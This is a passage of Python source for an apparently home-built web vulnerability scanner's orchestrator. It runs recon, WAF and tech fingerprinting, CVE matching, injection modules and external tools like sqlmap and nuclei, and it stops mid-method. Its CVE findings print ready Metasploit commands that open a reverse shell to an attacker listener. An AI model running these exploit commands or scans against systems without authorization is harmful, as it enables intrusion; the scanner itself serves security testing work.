"""Core scanner orchestration -- coordinates modules and manages the scan flow."""

import re
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional
from urllib.parse import urlparse
import logging

from .cve_db import extract_versions, match_cves
from .http_client import HTTPClient
from .modules.base import Finding
from .modules.cmdi import CommandInjectionScanner
from .modules.crlf import CRLFScanner
from .modules.headers import HeaderScanner
from .modules.bypass403 import Bypass403Scanner
from .modules.graphql import GraphQLScanner
from .modules.idor import IDORScanner
from .modules.jwt_analyzer import JWTAnalyzer
from .modules.lfi import LFIScanner
from .modules.open_redirect import OpenRedirectScanner
from .modules.sqli import SQLiScanner
from .modules.ssti import SSTIScanner
from .modules.ssrf import SSRFScanner
from .modules.xss import XSSScanner
from .modules.xxe import XXEScanner
from .modules.dom_xss import DOMXSSScanner
from .modules.prototype_pollution import PrototypePollutionScanner
from .modules.smuggling import SmugglingScanner
from .parser import (
    extract_forms,
    extract_params_from_url,
    get_base_url,
    parse_post_data,
)

_WAF_SIGNATURES = [
    (r"just a moment\.\.\.", "Cloudflare challenge"),
    (r"cloudflare", "Cloudflare"),
    (r"cf-ray", "Cloudflare"),
    (r"ddos-guard", "DDoS-Guard"),
    (r"access denied.*incapsula", "Imperva/Incapsula"),
    (r"request blocked.*mod_security", "ModSecurity"),
    (r"your ip has been blocked", "Generic WAF"),
    (r"blocked by the security rules", "Generic WAF"),
]

logger = logging.getLogger("vulnscanner")

_MODULE_MAP = {
    "sqli":      SQLiScanner,
    "xss":       XSSScanner,
    "lfi":       LFIScanner,
    "redirect":  OpenRedirectScanner,
    "cmdi":      CommandInjectionScanner,
    "crlf":      CRLFScanner,
    "ssti":      SSTIScanner,
    "headers":   HeaderScanner,
    "jwt":       JWTAnalyzer,
    "ssrf":      SSRFScanner,
    "xxe":       XXEScanner,
    "bypass403": Bypass403Scanner,
    "graphql":   GraphQLScanner,
    "idor":      IDORScanner,
    "domxss":    DOMXSSScanner,
    "prototype": PrototypePollutionScanner,
    "smuggling": SmugglingScanner,
}

# Modules excluded from the default "all" scan because they are slow or
# potentially disruptive to shared infrastructure. Selectable individually.
_HEAVY_MODULES = {"smuggling"}

# ANSI helpers for recon display
_CYAN = "\033[96m"
_DIM = "\033[2m"
_BOLD = "\033[1m"
_GREEN = "\033[92m"
_YELLOW = "\033[93m"
_RED = "\033[91m"
_RESET = "\033[0m"

# Default parallel module threads per parameter (overridden by --threads)
_DEFAULT_WORKERS = 4

# REST-style ID path segments (numeric or UUID), e.g. /api/orders/2 or
# /users/<uuid>. Used to synthesize an IDOR target when a path-only URL has no
# query/POST params (otherwise the IDOR module never runs on it).
_ID_PATH_SEG_RE = re.compile(
    r"/(?:\d{1,15}|[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-"
    r"[0-9a-fA-F]{4}-[0-9a-fA-F]{12})(?:/|$)"
)

# ---------------------------------------------------------------------------
# Technology fingerprints (header + body patterns)
# ---------------------------------------------------------------------------
_TECH_HEADER_SIGS = [
    ("X-Powered-By", r"PHP", "PHP"),
    ("X-Powered-By", r"ASP\.NET", "ASP.NET"),
    ("X-Powered-By", r"Express", "Express.js"),
    ("X-Powered-By", r"Servlet", "Java Servlet"),
    ("X-Generator", r"WordPress", "WordPress"),
    ("X-Generator", r"Drupal", "Drupal"),
    ("X-Drupal-Cache", r".", "Drupal"),
    ("Server", r"Apache", "Apache"),
    ("Server", r"nginx", "Nginx"),
    ("Server", r"Microsoft-IIS", "IIS"),
    ("Server", r"Werkzeug", "Flask/Werkzeug"),
    ("Server", r"gunicorn", "Gunicorn/Python"),
    ("Server", r"cloudflare", "Cloudflare"),
    ("Server", r"LiteSpeed", "LiteSpeed"),
    ("Set-Cookie", r"PHPSESSID", "PHP"),
    ("Set-Cookie", r"JSESSIONID", "Java"),
    ("Set-Cookie", r"ASP\.NET_SessionId", "ASP.NET"),
    ("Set-Cookie", r"csrftoken", "Django"),
    ("Set-Cookie", r"laravel_session", "Laravel"),
    ("Set-Cookie", r"rack\.session", "Ruby/Rack"),
    ("Set-Cookie", r"connect\.sid", "Node.js/Express"),
]

_TECH_BODY_SIGS = [
    (r"wp-content/", "WordPress"),
    (r"wp-includes/", "WordPress"),
    (r"/wp-json/", "WordPress"),
    (r"Joomla!", "Joomla"),
    (r"sites/default/files", "Drupal"),
    (r"content=\"WordPress", "WordPress"),
    (r"content=\"Joomla", "Joomla"),
    (r"content=\"Drupal", "Drupal"),
    (r"/__next/", "Next.js"),
    (r"/_nuxt/", "Nuxt.js"),
    (r"react\.production\.min\.js", "React"),
    (r"react-dom", "React"),
    (r"ng-version=", "Angular"),
    (r"vue\.(?:min\.)?js", "Vue.js"),
    (r"jquery[\.-]", "jQuery"),
    (r"bootstrap[\.-]", "Bootstrap"),
    (r"laravel", "Laravel"),
    (r"csrf-token", "Rails/Laravel"),
    (r"__vite", "Vite"),
    (r"/_astro/", "Astro"),
    (r"svelte", "Svelte"),
]


class Scanner:
    """Orchestrates vulnerability scanning across one or more modules.

    Usage::

        config = {"url": "http://target/page?id=1", "scan_type": "all", ...}
        findings = Scanner(config).run()
    """

    def __init__(self, config: Dict, app_logger=None) -> None:
        self.config = config
        self.findings: List[Finding] = []
        self._seen_keys: set = set()  # dedup: (vuln_type, url, param, payload)
        self._no_color = config.get("no_color", False)
        self._detected_waf: str = ""   # set by _preflight_check on WAF detection
        self._form_targets: List[Dict] = []  # form targets with their POST data

        # Adaptive rate limiter (shared across all module threads)
        self._rate_limiter = None
        if config.get("rate_limit"):
            from .rate_limiter import AdaptiveRateLimiter
            min_d = float(config.get("rate_limit_delay", 0.0))
            self._rate_limiter = AdaptiveRateLimiter(min_delay=min_d)

        self.http = HTTPClient(
            headers=config.get("headers", {}),
            cookies=config.get("cookies", {}),
            proxy=config.get("proxy"),
            timeout=config.get("timeout", 10),
            follow_redirects=config.get("follow_redirects", True),
            rate_limiter=self._rate_limiter,
        )

        scan_type = config.get("scan_type", "all")
        if scan_type == "all":
            # Heavy/disruptive modules (e.g. smuggling) are opt-in even on "all",
            # unless the caller explicitly enables them via config["aggressive"].
            aggressive = config.get("aggressive", False)
            self.module_classes = [
                cls for name, cls in _MODULE_MAP.items()
                if aggressive or name not in _HEAVY_MODULES
            ]
        elif scan_type in _MODULE_MAP:
            self.module_classes = [_MODULE_MAP[scan_type]]
        else:
            raise ValueError(f"Unknown scan type: {scan_type!r}")

    def run(self) -> List[Finding]:
        """Execute the scan and return all findings.

        On ``KeyboardInterrupt`` (Ctrl+C) the scan stops gracefully and
        returns every finding discovered so far so the reporter can still
        display partial results.
        """
        self._interrupted = False
        t0 = time.monotonic()
        url = self.config["url"]
        method = self.config.get("method", "GET").upper()
        data_string = self.config.get("data") or ""
        target_param = self.config.get("param")
        crawl = self.config.get("crawl", False)

        try:
            # -- Recon phase --
            if not self.config.get("quiet", False):
                self._print_recon(url)

            logger.info("Target  : %s [%s]", url, method)
            logger.info("Modules : %s", [cls.NAME for cls in self.module_classes])

            baseline_resp = self._preflight_check(url, method, data_string)

            # Notify user if static/CDN target detected (always visible, not just --verbose)
            if getattr(self, "_static_target", False) and not self.config.get("quiet", False):
                print(self._c(
                    "   [~] Static/CDN target detected — injection modules skipped. "
                    "Headers + GraphQL probes still active. Use --js-crawl for SPAs.",
                    _YELLOW,
                ))
                print()

            # Passive secret scan over the page + its same-origin JS bundles.
            # Runs on full scans regardless of injectable params being present.
            if baseline_resp is not None and self.config.get("scan_type", "all") == "all":
                self._passive_secret_scan(url, baseline_resp)

            # Authenticated session (opt-in): log in once so every subsequent
            # request — crawl, per-param modules, orchestrated checks — runs with
            # a real session. This is the single biggest unlock for recall, since
            # most interesting endpoints live behind login.
            self._crawl_result = None
            if self._orchestrated_enabled():
                self._authenticate()

            targets = self._build_targets(url, method, data_string, target_param)

            # App crawl (opt-in): walk the authenticated surface. The crawl result
            # always feeds the orchestrated checks; whether the newly-discovered
            # query targets are *also* run through the full per-param module
            # battery is controlled by ``crawl_scan_targets`` (default on). Turn it
            # off when you only want the orchestrated checks + the seed scanned
            # (much faster, e.g. for recall measurement).
            if self._orchestrated_enabled():
                crawl_targets = self._orchestrated_crawl(url, target_param)
                if self.config.get("crawl_scan_targets", True):
                    existing = {(t["url"], t["method"], t["param_name"]) for t in targets}
                    for ct in crawl_targets:
                        key = (ct["url"], ct["method"], ct["param_name"])
                        if key not in existing:
                            existing.add(key)
                            targets.append(ct)

            if (not targets or crawl) and baseline_resp is not None:
                form_targets = self._crawl_forms(url, baseline_resp, target_param)
                if form_targets:
                    existing_keys = {(t["url"], t["method"], t["param_name"]) for t in targets}
                    for ft in form_targets:
                        key = (ft["url"], ft["method"], ft["param_name"])
                        if key not in existing_keys:
                            targets.append(ft)
                            existing_keys.add(key)

            # JS-aware crawl (Playwright) — reveals SPA / modal forms
            if self.config.get("js_crawl"):
                js_targets = self._js_crawl(url, target_param, targets)
                targets.extend(js_targets)

            if not targets:
                logger.warning(
                    "No injectable parameters found. "
                    "Append query params to the URL (GET), supply --data (POST), "
                    "or use --crawl to auto-detect HTML forms."
                )
                return self.findings

            param_names = sorted({t["param_name"] for t in targets})
            logger.info("Parameters: %s", param_names)

            if not self.config.get("quiet", False):
                n_mods = len(self.module_classes)
                static_note = " [static/CDN — injection skipped]" if getattr(self, "_static_target", False) else ""
                print(self._c(
                    f"   [>] Scanning {len(targets)} target(s) × {n_mods} modules{static_note}",
                    _CYAN,
                ))
                print()

            for target in targets:
                self._scan_target(target)

            # Orchestrated, session-aware checks (auth-bypass, broken access,
            # mass assignment, stored XSS, BOLA, CSRF). They need the crawl
            # surface + (optionally) two identities, so they run after the
            # per-param loop and merge their findings with dedup.
            if self._orchestrated_enabled() and self._crawl_result is not None:
                self._run_active_checks_phase(url)

            # External tool pass — runs when explicitly requested, or when the
            # primary scan returned nothing and a WAF was detected.
            self._run_ext_tools(url, method, self.config.get("param"))

        except KeyboardInterrupt:
            self._interrupted = True
            print()  # newline after ^C
            logger.warning(
                "Scan interrupted by user (Ctrl+C). "
                "Delivering %d finding(s) collected so far.",
                len(self.findings),
            )

        elapsed = time.monotonic() - t0
        n = len(self.findings)
        if not self._interrupted:
            logger.info(
                "Scan complete -- %d finding%s in %.1fs.",
                n, "" if n == 1 else "s", elapsed,
            )
        return self.findings

    # ------------------------------------------------------------------
    # Recon display
    # ------------------------------------------------------------------

    def _c(self, text: str, code: str) -> str:
        return f"{code}{text}{_RESET}" if not self._no_color else text

    def _print_recon(self, url: str) -> None:
        """Resolve and display target information before scanning."""
        parsed = urlparse(url)
        hostname = parsed.hostname or ""

        # DNS resolution
        ip = "N/A"
        try:
            ip = socket.gethostbyname(hostname)
        except (socket.gaierror, OSError):
            pass

        # Quick GET request for server info + fingerprinting + latency
        server = ""
        status = ""
        latency_ms: Optional[float] = None
        techs: List[str] = []
        resp = None
        try:
            t0 = time.monotonic()
            resp = self.http.get(url)
            latency_ms = (time.monotonic() - t0) * 1000
            if resp is not None:
                status = str(resp.status_code)
                server = resp.headers.get("Server", "")
                techs = self._fingerprint(resp)
        except Exception:
            pass

        print(self._c("   +--- Target Recon ---", _DIM))
        print(self._c("   | Host     : ", _DIM) + self._c(hostname, _CYAN + _BOLD))
        print(self._c("   | IP       : ", _DIM) + self._c(ip, _CYAN))
        if status:
            sc = _GREEN if status.startswith("2") else (_YELLOW if status.startswith("3") else _RED)
            print(self._c("   | Status   : ", _DIM) + self._c(f"HTTP {status}", sc))
        if server:
            print(self._c("   | Server   : ", _DIM) + self._c(server, _YELLOW))
        # Remove techs already shown via Server header to avoid redundancy
        if server and techs:
            server_lower = server.lower().split("/")[0].strip()
            techs = [t for t in techs if t.lower() != server_lower]
        # Stash for downstream consumers (wpscan auto-detect, etc.)
        self.config["_detected_techs"] = techs
        if techs:
            print(self._c("   | Tech     : ", _DIM) + self._c(", ".join(techs), _YELLOW))
        if latency_ms is not None:
            lat_color = _GREEN if latency_ms < 500 else (_YELLOW if latency_ms < 2000 else _RED)
            print(self._c("   | Latency  : ", _DIM) + self._c(f"{latency_ms:.0f}ms", lat_color))
        if resp is not None:
            size = len(resp.text)
            if size > 1024 * 1024:
                size_str = f"{size / (1024*1024):.1f} MB"
            elif size > 1024:
                size_str = f"{size / 1024:.1f} KB"
            else:
                size_str = f"{size} B"
            print(self._c("   | Size     : ", _DIM) + self._c(size_str, _CYAN))
        print(self._c("   | Scheme   : ", _DIM) + self._c(parsed.scheme.upper(), _CYAN))
        print(self._c("   +----------------------", _DIM))
        print()

        # -- CVE detection from service versions --
        if resp is not None:
            versions = extract_versions(resp)
            cve_matches = match_cves(versions)
            if cve_matches:
                self._print_cve_box(cve_matches)
                self._create_cve_findings(cve_matches, url, parsed)

        # -- Port scan (opt-in) --
        if self.config.get("port_scan") and ip != "N/A":
            self._run_port_scan(ip, hostname)

        # -- Path discovery (opt-in) --
        if self.config.get("discover_paths"):
            base = f"{parsed.scheme}://{parsed.netloc}"
            self._run_path_discovery(base)

        # -- Subdomain enumeration (opt-in) --
        if self.config.get("discover_subs") and hostname:
            parts = hostname.split(".")
            if len(parts) >= 2:
                domain = ".".join(parts[-2:])
                self._run_subdomain_enum(domain)

    def _print_cve_box(self, matches: List[dict]) -> None:
        """Display matched CVEs in a styled box below recon."""
        n = len(matches)
        print(self._c(
            f"   +--- Outdated Services ({n} CVE{'s' if n != 1 else ''}) ---",
            _RED + "\033[1m",
        ))

        for m in matches:
            sev = m["severity"]
            if sev == "CRITICAL":
                sev_c = _RED + "\033[1m"
            elif sev == "HIGH":
                sev_c = _RED
            elif sev == "MEDIUM":
                sev_c = _YELLOW
            else:
                sev_c = _CYAN

            # First sentence of impact for the summary line
            short = m["impact"].split(". ")[0]

            print(self._c("   |", _DIM))
            print(
                self._c("   | ", _DIM)
                + self._c(f"[{sev}] ", sev_c)
                + self._c(f"{m['cve']} ", "\033[1m")
                + self._c(f"(CVSS {m['cvss']})", _DIM)
            )
            print(
                self._c("   |   ", _DIM)
                + self._c(f"{m['service'].title()} {m['version']}", _YELLOW)
                + self._c(f" -- {short}", _DIM)
            )
            if m["msf"]:
                payload_hint = (
                    f"  [{m['msf_payload']}]" if m.get("msf_payload") else ""
                )
                print(
                    self._c("   |   MSF: ", _DIM)
                    + self._c(m["msf"], "\033[92m")
                    + self._c(payload_hint, _DIM)
                )

        print(self._c("   |", _DIM))
        print(self._c("   +----------------------------------", _DIM))
        print()

    def _create_cve_findings(
        self, matches: List[dict], url: str, parsed,
    ) -> None:
        """Generate Finding objects for each CVE match."""
        host = parsed.hostname or "target"
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        ssl_flag = "set SSL true; " if parsed.scheme == "https" else ""

        for m in matches:
            sev = m["severity"]
            if sev in ("CRITICAL", "HIGH"):
                conf = "high"
            elif sev == "MEDIUM":
                conf = "medium"
            else:
                conf = "low"

            # Build reproduction steps
            advisory = m.get("advisory", f"https://nvd.nist.gov/vuln/detail/{m['cve']}")
            repro_lines = [
                "# 1. Confirm the service version:",
                f'$ curl -s -k -I "{url}" | grep -iE "Server|X-Powered-By|X-Generator"',
                f"# Expected to contain: {m['service'].title()} {m['version']}",
                "",
                f"# 2. Vulnerability: {m['cve']}  CVSS {m['cvss']}  [{sev}]",
                f"# {m['impact'].split('. ')[0]}",
                f"# Advisory: {advisory}",
            ]
            if m["msf"]:
                payload = m.get("msf_payload") or "generic/shell_reverse_tcp"
                repro_lines += [
                    "",
                    "# 3. Verify exploitability with Metasploit:",
                    f'$ msfconsole -q -x "use {m["msf"]}; '
                    f'set RHOSTS {host}; set RPORT {port}; '
                    f'{ssl_flag}check"',
                    "",
                    "# 4. Exploit (replace <LHOST> with your listener IP):",
                    f'$ msfconsole -q -x "use {m["msf"]}; '
                    f'set RHOSTS {host}; set RPORT {port}; '
                    f'set LHOST <LHOST>; set PAYLOAD {payload}; '
                    f'{ssl_flag}run"',
                    "",
                    "# 5. Searchsploit for additional PoCs:",
                    f'$ searchsploit "{m["cve"]}"',
                ]
            else:
                repro_lines += [
                    "",
                    "# 3. Search for public exploits:",
                    f'$ searchsploit "{m["cve"]}"',
                    f'$ searchsploit "{m["service"]}" "{m["version"]}"',
                    "",
                    f"# 4. Advisory: {advisory}",
                ]

            finding = Finding(
                vuln_type=f"Known CVE: {m['cve']}",
                url=url,
                method="GET",
                parameter="(version disclosure)",
                payload="N/A",
                evidence=f"{m['service'].title()}/{m['version']}",
                confidence=conf,
                details=m["impact"],
                reproduction="\n".join(repro_lines),
            )
            key = (finding.vuln_type, finding.url, finding.parameter, finding.payload)
            if key not in self._seen_keys:
                self._seen_keys.add(key)
                self.findings.append(finding)

    # ------------------------------------------------------------------
    # Port scan display
    # ------------------------------------------------------------------

    def _run_port_scan(self, ip: str, hostname: str) -> None:
        from .port_scanner import scan_ports
        print(self._c("   +--- Port Scan ---", _DIM))
        print(self._c(f"   | Scanning {hostname} ({ip}) ...", _DIM))
        results = scan_ports(ip)
        if not results:
            print(self._c("   | No open ports found in common list.", _DIM))
        else:
            for r in results:
                banner = f"  [{r['banner'][:60]}]" if r["banner"] and r["banner"] != "open" else ""
                svc_c = _YELLOW if r["port"] not in (80, 443) else _GREEN
                print(
                    self._c("   | ", _DIM)
                    + self._c(f"{r['port']:5d}/tcp", svc_c)
                    + self._c(f"  {r['service']:<20}", _CYAN)
                    + self._c(banner, _DIM)
                )
        print(self._c("   +-------------------", _DIM))
        print()

    # ------------------------------------------------------------------
    # Path discovery display
    # ------------------------------------------------------------------

    def _run_path_discovery(self, base_url: str) -> None:
        from .discovery import discover_paths
        http = HTTPClient(
            headers=self.config.get("headers", {}),
            cookies=self.config.get("cookies", {}),
            proxy=self.config.get("proxy"),
            timeout=self.config.get("timeout", 6),
        )
        print(self._c("   +--- Path Discovery ---", _DIM))
        print(self._c(f"   | Probing {base_url} ...", _DIM))
        results = discover_paths(base_url, http)
        if not results:
            print(self._c("   | No interesting paths found.", _DIM))
        else:
            for r in results:
                code = r["status"]
                if code == 200:
                    cc = _GREEN
                elif code in (301, 302):
                    cc = _CYAN
                elif code == 401:
                    cc = _YELLOW
                elif code == 403:
                    cc = _RED
                else:
                    cc = _DIM
                size_kb = f"{r['size'] / 1024:.1f}KB"
                print(
                    self._c("   | ", _DIM)
                    + self._c(f"[{code}]", cc)
                    + self._c(f"  {r['path']:<45}", "\033[97m")
                    + self._c(f"  {size_kb}", _DIM)
                )
        print(self._c("   +----------------------", _DIM))
        print()

    # ------------------------------------------------------------------
    # Subdomain enumeration display
    # ------------------------------------------------------------------

    def _run_subdomain_enum(self, domain: str) -> None:
        from .discovery import enumerate_subdomains, check_subdomain_takeover
        print(self._c("   +--- Subdomain Enumeration ---", _DIM))
        print(self._c(f"   | Enumerating *.{domain} ...", _DIM))
        results = enumerate_subdomains(domain)
        if not results:
            print(self._c("   | No live subdomains found.", _DIM))
        else:
            for fqdn, ip in results:
                # Check for subdomain takeover opportunity
                takeover = check_subdomain_takeover(fqdn, http_client=self.http)
                if takeover:
                    tag = self._c(f"  [TAKEOVER? {takeover['service']}]", _RED + _BOLD)
                    self.findings.append(Finding(
                        vuln_type="Subdomain Takeover (Potential)",
                        url=f"http://{fqdn}",
                        method="GET",
                        parameter="(DNS / CNAME)",
                        payload="N/A",
                        evidence=takeover["evidence"],
                        confidence=takeover["confidence"],
                        details=(
                            f"Subdomain {fqdn!r} CNAME points to "
                            f"{takeover['cname']!r} ({takeover['service']}) "
                            f"but the service returns an unclaimed-site response. "
                            f"An attacker may be able to register the target resource "
                            f"and serve arbitrary content under {fqdn!r}. "
                            f"Remediation: remove the dangling CNAME record or "
                            f"reclaim the resource on {takeover['service']}."
                        ),
                        reproduction=(
                            f"# 1. Verify the dangling CNAME:\n"
                            f"$ dig CNAME {fqdn}\n"
                            f"# Expected: {fqdn} CNAME {takeover['cname']}\n"
                            f"# 2. Confirm the service is unclaimed:\n"
                            f"$ curl -sk 'http://{fqdn}' | head -20\n"
                            f"# 3. Register the resource on {takeover['service']} to claim it."
                        ),
                    ))
                else:
                    tag = ""
                print(
                    self._c("   | ", _DIM)
                    + self._c(f"{fqdn:<45}", _CYAN + _BOLD)
                    + self._c(f"  {ip}", _YELLOW)
                    + tag
                )
        print(self._c("   +-----------------------------", _DIM))
        print()

    # ------------------------------------------------------------------
    # Technology fingerprinting
    # ------------------------------------------------------------------

    @staticmethod
    def _fingerprint(resp) -> List[str]:
        """Detect technologies from response headers and body patterns."""
        detected = set()

        # Header-based detection
        for header_name, pattern, tech_name in _TECH_HEADER_SIGS:
            value = resp.headers.get(header_name, "")
            if value and re.search(pattern, value, re.IGNORECASE):
                detected.add(tech_name)

        # Body-based detection (only first 50KB to stay fast)
        body = resp.text[:51200].lower()
        for pattern, tech_name in _TECH_BODY_SIGS:
            if re.search(pattern, body, re.IGNORECASE):
                detected.add(tech_name)

        return sorted(detected)

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _preflight_check(self, url: str, method: str, data_string: str):
        """Send one baseline request; warn on WAF/error; return the response."""
        if method == "GET":
            resp = self.http.get(url)
        else:
            resp = self.http.post(url, data=parse_post_data(data_string))

        if resp is None:
            logger.warning(
                "Baseline request failed (timeout or connection refused). "
                "Check the URL and your network connectivity."
            )
            return None

        logger.debug("Baseline: HTTP %d, %d bytes", resp.status_code, len(resp.text))

        if resp.status_code in (403, 429, 503):
            body_lower = resp.text.lower()
            for pattern, waf_name in _WAF_SIGNATURES:
                if re.search(pattern, body_lower, re.IGNORECASE):
                    self._detected_waf = waf_name
                    logger.warning(
                        "WAF/bot-protection detected (%s) -- HTTP %d. "
                        "Requests are blocked before reaching the application; "
                        "results will be unreliable. "
                        "Try --cookies with a valid session, or --proxy via Burp.",
                        waf_name, resp.status_code,
                    )
                    return resp
            logger.warning(
                "HTTP %d on baseline -- target may require auth (try --cookies).",
                resp.status_code,
            )

        # Static / CDN detection — must run AFTER the first response is received
        self._static_target = self._detect_static_target(url, resp)

        return resp

    def _detect_static_target(self, url: str, baseline_resp) -> bool:
        """Return True if the server serves identical content for any input.

        CDN-hosted SPAs (Firebase Hosting, Netlify, GitHub Pages) return the
        same pre-compiled index.html for every request regardless of method,
        params, or body.  On such targets every injection finding is a false
        positive — the server never reads the payload.

        Detection heuristic (two layers):
          1. Cache header: x-cache=HIT or cf-cache-status=HIT → likely static.
          2. Response-content stability: send a POST with random garbage and
             compare body length+hash with the baseline GET.
        """
        import random
        import string
        import hashlib

        baseline_len = len(baseline_resp.text)
        baseline_hash = hashlib.md5(baseline_resp.text[:8192].encode("utf-8", "replace")).hexdigest()

        # Layer 1: cache hit headers → almost certainly serving cached static
        headers_lower = {k.lower(): v for k, v in baseline_resp.headers.items()}
        x_cache = headers_lower.get("x-cache", "").upper()
        cf_cache = headers_lower.get("cf-cache-status", "").upper()
        served_by = headers_lower.get("x-served-by", "")
        cache_hit = "HIT" in x_cache or "HIT" in cf_cache

        # Layer 2: POST with garbage → if response is identical → static
        token = "".join(random.choices(string.ascii_lowercase, k=10))
        try:
            r_post = self.http.post(url, data={f"okrscann_{token}": token})
        except Exception:
            r_post = None

        responses_identical = (
            r_post is not None
            and len(r_post.text) == baseline_len
            and hashlib.md5(r_post.text[:8192].encode("utf-8", "replace")).hexdigest() == baseline_hash
        )

        if cache_hit and responses_identical:
            logger.warning(
                "STATIC/CDN target detected (x-cache=HIT, POST==GET response). "
                "Injection modules will be skipped — server ignores request body. "
                "Only headers and recon checks will run. "
                "To scan dynamic endpoints on this domain use --data or --js-crawl.",
            )
            return True

        if responses_identical and r_post is not None:
            # No cache header but content is identical — double-check with a GET variant
            try:
                r_get2 = self.http.get(url + f"?okrscann_{token}={token}")
            except Exception:
                r_get2 = None
            if (
                r_get2 is not None
                and len(r_get2.text) == baseline_len
                and hashlib.md5(r_get2.text[:8192].encode("utf-8", "replace")).hexdigest() == baseline_hash
            ):
                logger.warning(
                    "STATIC target detected (GET/POST/GET+param all return identical content). "
                    "Injection modules skipped. Only headers/recon checks will run."
                )
                return True

        if cache_hit and not responses_identical:
            logger.info(
                "CDN cache HIT detected (%s%s) but responses differ — "
                "target may be partially dynamic.  Scanning continues normally.",
                x_cache or cf_cache,
                f" via {served_by[:40]}" if served_by else "",
            )

        return False

    # ------------------------------------------------------------------
    # External tool integration (sqlmap / dalfox)
    # ------------------------------------------------------------------

    def _run_ext_tools(self, url: str, method: str, param: Optional[str]) -> None:
        """Secondary scan pass using external tools when explicitly requested.

        Activated by:
          - config["use_sqlmap"]  → run sqlmap (SQLi)
          - config["use_dalfox"]  → run dalfox (XSS)
          - config["use_nuclei"]  → run nuclei (CVE/template scan)
          - config["use_nikto"]   → run nikto (web server audit)
          - config["use_wpscan"]  → run wpscan (WordPress)
          - config["ext_tools"]   → run all

        Runs on both the seed URL and any discovered form targets so POST
        parameters are tested with the correct --data argument.
        """
        scan_type = self.config.get("scan_type", "all")
        use_sqlmap = self.config.get("use_sqlmap") or self.config.get("ext_tools")
        use_dalfox = self.config.get("use_dalfox") or self.config.get("ext_tools")
        use_nuclei = self.config.get("use_nuclei") or self.config.get("ext_tools")
        use_nikto  = self.config.get("use_nikto")  or self.config.get("ext_tools")
        use_wpscan = self.config.get("use_wpscan") or self.config.get("ext_tools")
        waf = self._detected_waf

        # Detect DBMS from native findings to hint sqlmap.
        dbms = None
        for f in self.findings:
            vt = f.vuln_type.lower()
            for db in ("mysql", "mssql", "postgresql", "oracle", "sqlite"):
                if db in vt or db in (f.evidence or "").lower():
                    dbms = db
                    break

        # Build a list of (url, param, method, data) tuples to scan.
        # Seed target + all discovered form targets so POST params get --data.
        _seed_data = self.config.get("data") or ""
        scan_targets = [(url, param, method, _seed_data)]
        for ft in self._form_targets:
            ft_data = "&".join(f"{k}={v}" for k, v in ft["params"].items())
            scan_targets.append((ft["url"], None, ft["method"], ft_data))
        # Deduplicate by (url, method)
        seen_t = set()
        unique_targets = []
        for t in scan_targets:
            key = (t[0], t[2])
            if key not in seen_t:
                seen_t.add(key)
                unique_targets.append(t)

        if use_sqlmap and scan_type in ("sqli", "all"):
            sqli_findings = [f for f in self.findings if "sql" in f.vuln_type.lower()]
            for t_url, t_param, t_method, t_data in unique_targets:
                if not sqli_findings or waf:
                    self._ext_sqlmap(t_url, t_param, waf, dbms,
                                     override_method=t_method, override_data=t_data)

        if use_dalfox and scan_type in ("xss", "all"):
            xss_findings = [f for f in self.findings if "xss" in f.vuln_type.lower()
                            or "cross-site" in f.vuln_type.lower()]
            for t_url, t_param, t_method, t_data in unique_targets:
                if not xss_findings or waf:
                    self._ext_dalfox(t_url, waf,
                                     override_method=t_method, override_data=t_data)

        if use_nuclei and scan_type in ("all", "headers"):
            self._ext_nuclei(url)

        if use_nikto and scan_type in ("all", "headers"):
            self._ext_nikto(url)

        if use_wpscan:
            self._ext_wpscan(url)

        # Always print next-step suggestions based on what was found
        if not self.config.get("quiet"):
            self._suggest_follow_up(url)

    def _ext_sqlmap(
        self, url: str, param: Optional[str], waf: str, dbms: Optional[str],
        override_method: str = "", override_data: str = "",
    ) -> None:
        from .tools.sqlmap import SqlmapRunner
        from .tools import is_available
        if not is_available("sqlmap"):
            if not self.config.get("quiet"):
                print(self._c(
                    "   [i] sqlmap not found — install: pip install sqlmap  or  apt install sqlmap",
                    _DIM,
                ))
            return
        if not self.config.get("quiet"):
            waf_note = f" (WAF: {waf})" if waf else ""
            method_note = f" [{override_method} form]" if override_method and override_method.upper() == "POST" else ""
            print(self._c(
                f"   [~] Launching sqlmap{method_note}{waf_note}...",
                _YELLOW,
            ))
        runner = SqlmapRunner(self.config)
        new_findings = runner.run(
            url, param=param, waf_name=waf, dbms=dbms,
            override_method=override_method, override_data=override_data,
        )
        for f in new_findings:
            self._add_finding(f)
        if new_findings and not self.config.get("quiet"):
            print(self._c(f"   [+] sqlmap: {len(new_findings)} finding(s) added.", _GREEN))

    def _ext_dalfox(
        self, url: str, waf: str,
        override_method: str = "", override_data: str = "",
    ) -> None:
        from .tools.dalfox import DalfoxRunner
        from .tools import is_available
        if not is_available("dalfox"):
            if not self.config.get("quiet"):
                print(self._c(
                    "   [i] dalfox not found — install: go install github.com/hahwul/dalfox/v2@latest",
                    _DIM,
                ))
            return
        if not self.config.get("quiet"):
            waf_note = f" (WAF: {waf})" if waf else ""
            method_note = f" [POST form]" if override_method and override_method.upper() == "POST" else ""
            print(self._c(f"   [~] Launching dalfox{method_note}{waf_note}...", _YELLOW))
        runner = DalfoxRunner(self.config)
        new_findings = runner.run(
            url, waf_name=waf,
            override_method=override_method, override_data=override_data,
        )
        for f in new_findings:
            self._add_finding(f)
        if new_findings and not self.config.get("quiet"):
            print(self._c(f"   [+] dalfox: {len(new_findings)} finding(s) added.", _GREEN))

    def _ext_nuclei(self, url: str) -> None:
        from .tools.nuclei import NucleiRunner
        from .tools import is_available
        if not is_available("nuclei"):
            if not self.config.get("quiet"):
                print(self._c(
                    "   [i] nuclei not found — install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
                    _DIM,
                ))
            return
        if not self.config.get("quiet"):
            print(self._c("   [~] Launching nuclei template scan...", _YELLOW))
        runner = NucleiRunner(self.config)
        for f in runner.run(url):
            self._add_finding(f)

    def _ext_nikto(self, url: str) -> None:
        from .tools.nikto import NiktoRunner
        from .tools import is_available
        if not is_available("nikto"):
            if not self.config.get("quiet"):
                print(self._c(
                    "   [i] nikto not found — install: apt install nikto",
                    _DIM,
                ))
            return
        if not self.config.get("quiet"):
            print(self._c("   [~] Launching nikto web server audit...", _YELLOW))
        runner = NiktoRunner(self.config)
        for f in runner.run(url):
            self._add_finding(f)

    def _ext_wpscan(self, url: str) -> None:
        from .tools.wpscan import WPScanRunner
        from .tools import is_available
